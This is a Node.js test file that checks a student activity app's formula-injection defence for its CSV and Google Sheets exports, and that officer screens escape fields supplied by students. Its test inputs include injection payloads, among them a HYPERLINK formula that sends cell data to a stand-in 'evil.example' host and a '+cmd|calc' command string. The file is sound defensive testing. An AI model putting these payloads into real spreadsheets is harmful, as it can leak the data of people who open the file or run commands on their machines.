// Activity descriptions and types are written by students' browsers and leave
// the app in two files an officer opens: the CSV export and the Google Sheets
// sync. A cell starting with = + - @ is a formula to Excel and Sheets, and a
// formula can fetch a URL carrying the sheet with it. neutralizeFormula()
// turns those into plain text; plain numbers are left alone.
const fs=require('fs'),path=require('path');
const src=fs.readFileSync(path.join(__dirname,'..','app.js'),'utf8');
let fails=0;
const check=(l,c,e)=>{if(c)console.log('PASS: '+l);else{fails++;console.log('FAIL: '+l+(e?' -- '+e:''));}};
function grabFn(name){
  const m=new RegExp('^function '+name+'\\(','m').exec(src);
  if(!m)throw new Error('not found: '+name);
  let i=src.indexOf('{',m.index),d=0;
  for(;i<src.length;i++){ if(src[i]==='{')d++; else if(src[i]==='}'){d--;if(!d)return src.slice(m.index,i+1);} }
}
eval(grabFn('neutralizeFormula').replace(/^function /,'global.neutralizeFormula=function '));

for(const [input,want] of [
  ['=HYPERLINK("https://evil.example/?"&A1,"x")',"'=HYPERLINK(\"https://evil.example/?\"&A1,\"x\")"],
  ['+cmd|calc',"'+cmd|calc"],
  ['@SUM(A1)',"'@SUM(A1)"],
  ['-2+3+cmd',"'-2+3+cmd"],
  ['\t=1',"'\t=1"],
  ['-50.12','-50.12'],
  ['+15','+15'],
  ['1250','1250'],
  ['Kyle bought 5 × AZEI','Kyle bought 5 × AZEI'],
  ['',''],
])
  check(JSON.stringify(input)+' -> '+JSON.stringify(want), neutralizeFormula(input)===want, JSON.stringify(neutralizeFormula(input)));
check('numbers and nulls pass through untouched', neutralizeFormula(-50.12)===-50.12 && neutralizeFormula(null)===null);

check('the CSV export neutralizes every cell', /const s=neutralizeFormula\(String\(v\)\.replace\(/.test(src));
check('...and folds carriage returns as well as newlines', /replace\(\/\[\\r\\n\]\+\/g,' '\)/.test(src));
check('the Sheets sync neutralizes every string it sends',
      /JSON\.stringify\(\{type,\.\.\.payload\},\(k,v\)=>neutralizeFormula\(v\)\)/.test(src));

// The officer screens: every field that came from a student's browser is escaped.
check('dashboard escapes the time and type', /\$\{esc\(a\.ts\|\|''\)\}<\/td><td><span class="badge b-gray">\$\{esc\(a\.type\)\}<\/span>/.test(src));
check('activity tab escapes the type', /\$\{typeIcon\[a\.type\]\|\|''\} \$\{esc\(a\.type\)\}/.test(src));
check('...the filter options', /<option value="\$\{esc\(t\)\}" \$\{f\.type===t\?'selected':''\}>\$\{esc\(t\)\}<\/option>/.test(src));
check('...and the hash tooltip', /title="\$\{esc\(a\.entry_hash\|\|'no hash'\)\}"/.test(src));
check('no raw ${a.type} left anywhere', !/\$\{a\.type\}/.test(src));

console.log(fails?('\n'+fails+' check(s) failed'):'\nall checks passed');
process.exit(fails?1:0);
